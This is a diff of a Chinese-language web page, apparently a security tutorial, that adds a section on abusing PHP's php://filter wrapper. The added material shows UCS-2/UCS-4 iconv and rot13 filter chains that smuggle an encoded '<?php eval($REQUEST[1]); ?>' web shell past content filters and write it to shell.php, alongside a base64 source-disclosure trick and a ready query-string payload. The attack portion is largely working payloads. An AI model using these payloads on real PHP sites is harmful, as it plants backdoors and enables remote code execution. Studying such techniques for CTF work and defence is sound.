@@ -334,7 +334,10 @@
 <p>用法：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $postdata = file_get_contents(<span class="string">&quot;php://input&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2、PHP-filter"><a href="#2、PHP-filter" class="headerlink" title="2、PHP://filter"></a>2、PHP://filter</h3><table>
+<h3 id="2、PHP-filter"><a href="#2、PHP-filter" class="headerlink" title="2、PHP://filter"></a>2、PHP://filter</h3><blockquote>
+<p>file_put_content与php:filter利用技巧：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/vege/p/12650702.html">https://www.cnblogs.com/vege/p/12650702.html</a></p>
+</blockquote>
+<table>
 <thead>
 <tr>
 <th align="left">名称</th>
@@ -369,7 +372,20 @@
 <p>典型的文件包含漏洞。我们可以通过构造含有漏洞的语句，查看想要看的代码： file=php://filter/convert.base64-encode/resource=index.php 。再将得到的base64码解码即可。</p>
 </blockquote>
 <p>read参数值可为</p>
-<p>string.strip_tags： 将数据流中的所有html标签清除<br>string.toupper： 将数据流中的内容转换为大写<br>string.tolower： 将数据流中的内容转换为小写<br>convert.base64-encode： 将数据流中的内容转换为base64编码 convert.base64-decode： 与上面对应解码</p>
+<p>string.strip_tags： 将数据流中的所有html标签清除<br>string.toupper： 将数据流中的内容转换为大写<br>string.tolower： 将数据流中的内容转换为小写</p>
+<p>string.rot13：<br>convert.base64-encode： 将数据流中的内容转换为base64编码 convert.base64-decode： 与上面对应解码</p>
+<p>convert.iconv.UCS-4LE.UCS-4BE</p>
+<p>convert.iconv.UCS-2LE.UCS-2BE</p>
+<p>UCS编码：</p>
+<p>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#x27;aa&lt;?php phpinfo();?&gt;&#x27;);</span></span><br><span class="line">?&lt;aa phpiphp(ofn&gt;?;)</span><br><span class="line">    </span><br><span class="line">$a=<span class="string">&#x27;php://filter/convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=shell.php&#x27;</span>;</span><br><span class="line"><span class="comment">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?;)之前字符个数是4的倍数,所以补充了 xxx</span></span><br><span class="line"></span><br><span class="line">hp?&lt;ve p$(laUQER[TSE;)]<span class="number">11</span>&gt;? </span><br><span class="line"><span class="comment">#&lt;?php eval($REQUEST[1]); ?&gt;1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);</span></span><br><span class="line">?&lt;hp phpipfn(o;)&gt;?</span><br><span class="line"></span><br><span class="line">$a=<span class="string">&#x27;php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">?&lt;hp pvela$(ERUQSE[T]<span class="number">1</span>;)? <span class="number">1</span>&gt;</span><br><span class="line"><span class="comment">#&lt;?php eval($REQUEST[1]); ?&gt;1</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>filter协议中支持多个过滤器进行过滤，过滤器间用管道符分割</strong></p>
+<p>例如：rot13+UCS组合拳</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/string.rot13|convert.iconv.UCS-4LE.UCS-4BE|uc?&lt;ir c$(ynHDRE[GFR;)]11&gt;? /resource=shell.php</span></span><br></pre></td></tr></table></figure>
+
 <h2 id="二、Phar"><a href="#二、Phar" class="headerlink" title="二、Phar://"></a>二、Phar://</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar=<span class="keyword">new</span> Phar(<span class="string">&#x27;my2.phar&#x27;</span>);</span><br><span class="line">$phar-&gt;buildFromDirectory(<span class="keyword">__DIR__</span>,<span class="string">&#x27;/index.php/&#x27;</span>);</span><br><span class="line">$phar-&gt;compressFiles(Phar::GZ);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">$phar-&gt;setStub($phar-&gt;createDefaultStub(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p> Phar文件是一个文件的集合文件，或者称之为压缩文件也可以。<br>在例子中通过buildFromDirectory函数来调用当前目录下的index.php构建phar文档。<br>之后通过compressFiles函数进行phar文件的压缩，其中的Phar::GZ为压缩类型，目前默认支持的压缩类型为Phar::GZ、Phar::BZ2。<br>最后通过setStub来设置通过createDefaultStub创建的phar存根，phar文件在触发时会通过存根文件开始运行。</p>
